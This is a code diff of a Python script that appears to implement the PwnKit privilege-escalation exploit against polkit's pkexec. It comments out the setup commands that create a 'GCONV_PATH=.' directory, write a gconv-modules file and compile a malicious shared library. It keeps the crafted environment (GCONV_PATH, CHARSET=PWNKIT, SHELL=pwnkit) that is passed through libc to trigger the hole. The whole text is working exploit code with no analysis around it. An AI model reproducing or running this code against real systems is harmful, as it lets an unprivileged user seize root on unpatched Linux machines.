@@ -18,10 +18,10 @@ void gconv_init() {
 '''
 
 def main():
-    os.system("mkdir -p 'GCONV_PATH=.' pwnkit ; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'")
-    os.system("echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules")
-    f=open("pwnkit/pwnkit.c","w") ; f.write(so) ;f.close()
-    os.system("/home/john/cv/gcc2/opt/gcc-latest/bin/gcc pwnkit/pwnkit.c -I/home/john/cv/libc6-dev/usr/include -o pwnkit/pwnkit.so -shared -fPIC")
+    # os.system("mkdir -p 'GCONV_PATH=.' pwnkit ; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'")
+    # os.system("echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules")
+    # f=open("pwnkit/pwnkit.c","w") ; f.write(so) ;f.close()
+    # os.system("/home/john/cv/gcc2/opt/gcc-latest/bin/gcc pwnkit/pwnkit.c -I/home/john/cv/libc6-dev/usr/include -o pwnkit/pwnkit.so -shared -fPIC")
     envi=[b"pwnkit", b"PATH=GCONV_PATH=.",b"CHARSET=PWNKIT",b"SHELL=pwnkit",None]
     env=(c_char_p * len(envi))() ;env[:]=envi
     libc = CDLL(find_library('c'))
